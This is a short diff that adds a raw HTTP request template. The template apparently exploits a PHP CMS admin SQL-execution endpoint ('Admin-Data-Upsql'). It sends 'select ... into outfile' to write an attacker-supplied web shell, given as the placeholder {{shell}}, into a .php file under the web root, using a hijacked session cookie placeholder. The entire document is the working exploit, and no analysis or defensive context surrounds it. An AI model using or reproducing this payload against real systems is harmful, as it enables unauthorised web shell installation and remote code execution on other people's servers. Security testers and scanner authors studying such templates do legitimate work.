@@ -1,0 +1,7 @@
+POST /index.php?s=Admin-Data-Upsql HTTP/1.1
+Host: 172.16.0.68
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID={{cookie}};
+Content-Length: 112
+
+sql=+select+%27{{shell}}%27+into+outfile+%27%2Fweb%2F{{filename}}.php%27%3B&submit=%E6%8F%90+%E4%BA%A4
